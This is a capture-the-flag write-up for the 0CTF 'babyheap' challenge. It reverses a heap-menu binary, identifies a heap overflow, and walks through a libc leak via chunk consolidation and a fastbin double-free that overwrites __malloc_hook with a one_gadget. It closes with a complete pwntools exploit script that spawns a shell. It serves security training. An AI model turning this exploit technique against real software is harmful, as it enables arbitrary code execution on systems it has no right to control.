# 0ctf babyheap

For this we are given a binary and a libc file. In order for this exploit to work, you need to run it with the right libc version (look at the exploit code to see how to do it). Let's take a look at what we have here:

```
$    file 0ctfbabyheap
0ctfbabyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
$    pwn checksec 0ctfbabyheap
[*] '/home/guyinatuxedo/Desktop/prayer/0ctfbabyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./0ctfbabyheap
===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command:
```

## Reversing

So we can see that we are dealing with a 64 bit binary, with all of the standard elf mitigations. When we run it, we see that we are given a menu with the option to either `Allocate/Fill/Free/Dump/Exit`. When we take a look at the functions in Ghidra we don't see a `main` function. However we can find a function that looks like a menu (either by going through the functions, or checking the x-references to strings we see, and tracing back the function calls):

```
undefined8 heapPointers(void)

{
  undefined8 heapPointers;
  undefined8 menuInput;
 
  heapPointers = FUN_00100b70();
LAB_00101133:
  printMenu();
  menuInput = getInt();
  switch(menuInput) {
  case 1:
    allocate(heapPointers);
    goto LAB_00101133;
  case 2:
    fill(heapPointers);
    goto LAB_00101133;
  case 3:
    free(heapPointers);
    goto LAB_00101133;
  case 4:
    dump(heapPointers);
    goto LAB_00101133;
  case 5:
    break;
  
  return 0;
}
```

So we can see that this is a pretty standard menu function. When we take a look at the `allocate` function, we see this:

```
void allocate(long heapPointers)

{
  void *ptr;
  uint newIndex;
  int size;
 
  newIndex = 0;
  while( true ) {
    if (0xf < (int)newIndex) {
      return;
    }
    if (*(int *)(heapPointers + (long)(int)newIndex * 0x18) == 0) break;
    newIndex = newIndex + 1;
  
  printf("Size: ");
  size = getInt();
  if (size < 1) {
    return;
  
  if (0x1000 < size) {
    size = 0x1000;
  
  ptr = calloc((long)size,1);
  if (ptr != (void *)0x0) {
    *(undefined4 *)(heapPointers + (long)(int)newIndex * 0x18) = 1;
    *(long *)((long)(int)newIndex * 0x18 + heapPointers + 8) = (long)size;
    *(void **)((long)(int)newIndex * 0x18 + heapPointers + 0x10) = ptr;
    printf("Allocate Index %d\n",(ulong)newIndex);
    return;
  
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

So we can see a few things here. The first is that it does a check on the amount of chunks it has allocated, and that the max is `0x10` After that it prompts us for a size, that has to be between `1` - `0x1000`. It will then allocate a chunk equal to that size with `calloc`. Proceeding that it will save a pointer to the newly allocated chunk along with its size in `heapPointers` (the arg passed to this function) . Next up we take a look at the `fill` function:

```
void fill(long heapPointers)

{
  int index;
  int size;
 
  printf("Index: ");
  index = getInt();
  if (((-1 < index) && (index < 0x10)) && (*(int *)(heapPointers + (long)index * 0x18) == 1)) {
    printf("Size: ");
    size = getInt();
    if (0 < size) {
      printf("Content: ");
      requestInput(*(long *)(heapPointers + (long)index * 0x18 + 0x10),(long)size);
    }
  
  return;
}
```

So looking at this function, we can see a few things. First it prompts you for the index, and checks it. It will then prompt you for a size, and check if it is greater than `0`. Then it will run `requestInput` with the arguments being a pointer to the chunk we specified with an index, and the size we gave it. This function essentially just scans in the amount of bytes equal to the second argument to the pointer passed to it in the first argument. While it checks to see if the size is greater than zero, it doesn't check to see if the data will overflow it so we have a heap overflow bug. Next up we take a look at the `free` function:

```
void free(long heapPointers)

{
  int index;
 
  printf("Index: ");
  index = getInt();
  if (((-1 < index) && (index < 0x10)) && (*(int *)(heapPointers + (long)index * 0x18) == 1)) {
    *(undefined4 *)(heapPointers + (long)index * 0x18) = 0;
    *(undefined8 *)(heapPointers + (long)index * 0x18 + 8) = 0;
    free(*(void **)(heapPointers + (long)index * 0x18 + 0x10));
    *(undefined8 *)(heapPointers + (long)index * 0x18 + 0x10) = 0;
  
  return;
}
```

Starting out we see it prompts us for an index, and performs the same index check on it. After that it will free the chunk pointer, and zero out the various elements of the data stored in `heapPointers` (so no use after free). Also since the `allocate` function looks for the first blank spot, after we free a chunk that index will be the first one allocated after that. Next up we have the `dump` function:

```
void dump(long heapPointers)

{
  undefined8 uVar1;
  int index;
 
  printf("Index: ");
  index = getInt();
  if (((-1 < index) && (index < 0x10)) && (*(int *)(heapPointers + (long)index * 0x18) == 1)) {
    puts("Content: ");
    uVar1 = *(undefined8 *)(heapPointers + (long)index * 0x18 + 8);
    printChunk(*(undefined8 *)(heapPointers + (long)index * 0x18 + 0x10),uVar1,(long)index * 0x18,
               uVar1);
    puts("");
  
  return;
}
```

Here it prompts us for an index and checks it, just like every other function. Then it will print the contents of the chunk for us with the `printChunk` function.


## Exploitation

So we have the ability to freely allocate and free chunks between `1-0x1000` bytes in size, and up to `0x10` chunks at a time. We can also view the contents of the chunks, and have a heap overflow bug. For this exploit, there will be two parts. The first will involve causing heap consolidation to get a libc infoleak. The second will involve using a Fastbin Attack to write a oneshot gadget to the hoo of malloc. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will give us a shell when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are):
 
#### Infoleak

For the infoleak, we will be using a heap consolidation technique. Below you can see exactly how we allocate/free/manage space:

First we allocate four chunks:
```
0xf0:    0
0x70:    1
0xf0:    2
0x30:    3
```

Proceeding that we will free chunks 0 and 1. This will add those chunks to the free list, and if we allocate a chunk of a similar size we will get that chunk again:
```
0xf0:    (freed)
0x70:    (freed)
0xf0:    2
0x30:    3
```

Now that they have been added to the free list, we can allocate another chunk that is `0x78` bytes large. Due to it’s size (and the fact that we just freed a chunk of similar size) it will take the place of the old chunk 1:

```
0xf0:    (freed)
0x78:    0
0xf0:    2
0x30:    3
```

With that we can overflow chunk 2's metadata by using the bug we found with filling chunk 0. We will overflow the previous chunk size to be `0x180`, and the previous chunk in use bit to be `0x0`. That way when we free chunk `2`, it will think that the previous chunk isn't in use, and that the previous chunk's size is `0x180`. As a result it will move the heap back to where the first chunk 0 was, so when we allocate new heap space it will start where the first chunk 0 was:

```
0xf0:    (freed)
0x78:    0 Filled with data to overflow 2
0xf0:    2 (previous chunk overflowed to 0x180, previous in use bit overflowed to 0x0)
0x30:    3
```

Now that chunk 2's metadata has been overflowed, we can go ahead and free it. This will move the heap back to where the first chunk 0 was. By doing this, it will effictively forget about the new chunk 0, and will allow us to push a libc address into it's data section (the section after the heap metadata) so we can just print the chunk and leak the libc address:

```
0xf0:    (freed)
0x78:    0
0xf0:    (freed)
0x30:    3
```

Proceeding that we can just allocate a new chunk that is `0xf0` bytes large (same size as original chunk 0), and it will push the libc address for `main_arena+88` into the data section of chunk 0:

```
0xf0:    1
0x78:    0 main_arena+88 in content section
0xf0:    (freed)
0x30:    3
```

Proceeding that we can just print the contents of chunk 0, and we will leak the libc address for `main_arena+88` (main arena contains heap memory that can be allocated without directly calling `mmap`).

#### Write over Malloc Hook

Now that we have the libc leak, we can execute the write over the malloc hook. In order to do this, we will need to create a fake chunk in libc (where the malloc hook is), and get calloc to return it. This way we can write to the malloc hook by writing to the fake chunk.

In order to do this, we will need to allocate the same chunk twice, which we can do if the chunk has multiple entries in the free list. This can be done if we execute a double free. Luckily for us, the infoleak leaves us in a good situation for this. This is because chunk 0 is essentially forgotten about, so if we format it write we will be able to allocate a chunk where chunk 0 currently is, that way we would have two pointers to the same chunk. Using those two pointers, we can free the same chunk twice and add the entry to the free list twice.

So this will start off from where the infoleak ended. We will continue by freeing chunk 1, so we can reformat our heap space to allocate another pointer to where chunk 0 is:
```
0xf0:    (freed)
0x78:    0
0xf0:    (freed)
0x30:    3
```

Proceeding that we can allocate four new chunks. The first chunk will be `0x10` bytes large, and the other three will be `0x60` bytes large. With that, due to the heap metadata the third chunk will directly overlap with the old chunk 0. As a result we would have the two pointers to the same chunk that we need:

```
0x10:    1
0x60:    2
0x60:    4
0xf0 & 0x60:    0 & 5 (these two chunks begin at exactly the same spoit, and have the same ptr)
0x30:    3
```

Proceeding this we can free the chunks `5`, `4`, and `0`. We need to free another chunk in between `5` and `4`, the reason for this being that when we free one of those chunks, it gets placed at the top of the free list. In addition to that if we free a chunk that is at the top of the free list, the program crashes. So if we free a chunk in between, when the same chunk get's freed again it won't be while it is also at the top of the free chunk (thus the program won't crash):

```
0x10:    1
0x60:    2
0x60:    (freed)
0xf0 & 0x60:    (freed) (these two chunks begin at exactly the same spoit, and have the same ptr)
0x30:    3
```

Now our free list starts with chunks `5`, `4`, and `0`. Proceeding that we can allocate another two chunks of the same size as `5`, `4`, and `0`. This will allow us to edit the memory that the old  `0` & `5` chunks point to:

```
0x10:    1
0x60:    2
0x60:    4
0xf0 & 0x60:    (freed & 0) (these two chunks begin at exactly the same spoit, and have the same ptr)
0x30:    3
```

Now that we have a chunk that is allocated and on top of the free list, we can get ready to add the fake chunk to the free list. To do this we will edit chunk 0, and write the address a little bit before the malloc_hook to it. The reason for this being is that when we allocate this new chunk that starts with this address, it will add that address to the free list (the reason why integer that we picked the one that is in the exploit is because it points to an integer that malloc will think is a free size, so the program doesn't crash):

```
0x10:    1
0x60:    2
0x60:    4
0xf0 & 0x60:    (freed & 0) (these two chunks begin at exactly the same spoit, and have the same ptr) content = fake chunk address
0x30:    3
```
 
 Now we can just allocate chunk 5 again, and due to the previous steps the address of our fake chunk will get added to the free list:
 
```
0x10:    1
0x60:    2
0x60:    4
0xf0 & 0x60:    (5 & 0) (these two chunks begin at exactly the same spoit, and have the same ptr) content = fake chunk address
0x30:    3
```

Now that the fake chunk has been added (and is at the top) of the free list, we can just allocate the fake chunk:

```
0x10:    1
0x60:    2
0x60:    4
0xf0 & 0x60:    (5 & 0) (these two chunks begin at exactly the same spoit, and have the same ptr) content = fake chunk address
0x30:    3
0x60:    6    fake chunk for malloc_hook
```

Now that we have a fake chunk, we can write over the malloc_hook. The value we will write over the malloc hook will be a ROP Gadget that due to our setup, we can just call that one address and get a shell. For this we will be using the tool One_Gadget from https://github.com/david942j/one_gadget to "One Shot" the program with a single ROP Gadget from libc that will give us a shell. To use this tool, you just need to point it at the libc file you are using (we will be using the gadget at `0x4526a`):

```
one_gadget libc-2.23.so
0x45216    execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a    execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274    execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117    execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```


## Exploit

Putting it all together, we have the following exploit. Also this exploit will only work against libc version `libc-2.23.so`. If you are running an OS with a different libc version, you can just used `LD_PRELOAD` to swap out the libc version. Also I ran this exploit on `Ubuntu 16.04.6` sine Ubuntu 18.04 doesn't work well with this libc version (at least when I try this):

```
# Import pwntools
from pwn import *

# First establish the target process and libc file
target = process('./0ctfbabyheap', env={"LD_PRELOAD":"./libc-2.23.so"}) # The ld_preload is used to switch out the libc version we are using
#gdb.attach(target)
elf = ELF('libc-2.23.so')

# Establish the functions to interact with the program
def alloc(size):
    target.recvuntil("Command: ")
    target.sendline("1")
    target.recvuntil("Size: ")
    target.sendline(str(size))

def fill(index, size, content):
    target.recvuntil("Command: ")
    target.sendline("2")
    target.recvuntil("Index: ")
    target.sendline(str(index))
    target.recvuntil("Size: ")
    target.sendline(str(size))
    target.recvuntil("Content: ")
    target.send(content)

def free(index):
    target.recvuntil("Command: ")
    target.sendline("3")
    target.recvuntil("Index: ")
    target.sendline(str(index))

def dump(index):
    target.recvuntil("Command")
    target.sendline("4")
    target.recvuntil("Index: ")
    target.sendline(str(index))
    target.recvuntil("Content: \n")
    content = target.recvline()
    return content

# Make the initial four allocations, and fill them with data
alloc(0xf0)# Chunk 0
alloc(0x70)# Chunk 1
alloc(0xf0)# Chunk 2
alloc(0x30)# Chunk 3
fill(0, 0xf0, "0"*0xf0)
fill(1, 0x70, "1"*0x70)
fill(2, 0xf0, "2"*0xf0)
fill(3, 0x30, "3"*0x30)

# Free the first two
free(0)# Chunk 0
free(1)# Chunk 1

# Allocate new space where chunk 1 used to be, and overflow chunk chunk 2's previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100
alloc(0x78)# Chunk 0
fill(0, 128, '4'*0x70 + p64(0x180) + p64(0x100))

# Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0
free(2)

# Allocate a new chunk that will move the libc address for main_arena+88 into the content
alloc(0xf0)# Chunk 1
fill(1, 0xf0, '5'*0xf0)

# Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else
leak = u64(dump(0)[0:8])
libc = leak - elf.symbols['__malloc_hook'] - 0x68
system = libc + 0x4526a
malloc_hook = libc + elf.symbols['__malloc_hook']
free_hook = libc + elf.symbols['__free_hook']
fake_chunk = malloc_hook - 0x23
log.info("Leak is:        " + hex(leak))
log.info("System is:      " + hex(system))
log.info("Free hook is:   " + hex(free_hook))
log.info("Malloc hook is: " + hex(malloc_hook))
log.info("Fake chunk is:  " + hex(fake_chunk))
log.info("libc is:        " + hex(libc))

# Free the first chunk to make room for the double free/fastbin duplicaion
free(1)

# Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer
alloc(0x10)# Chunk 1
alloc(0x60)# Chunk 2
alloc(0x60)# Chunk 4
alloc(0x60)# Chunk 5

# Commence the double free by freeing 5 then 0, and 4 in between to stop a crash
free(5)
free(4)
free(0)

# Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list
alloc(0x60)# Chunk 4
alloc(0x60)# Chunk 5
fill(0, 0x60, p64(fake_chunk) + p64(0) + 'y'*0x50)
alloc(0x60)# Chunk 0

# Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget
alloc(0x60)# Chunk 6
fill(6, 0x1b, 'z'*0x13 + p64(system))

# Trigger a Malloc call to trigger the malloc hook, and pop a shell
target.sendline('1\n1\n')
target.recvuntil("Size: ")

# Drop to an interactive shell to use the shell
target.interactive()
```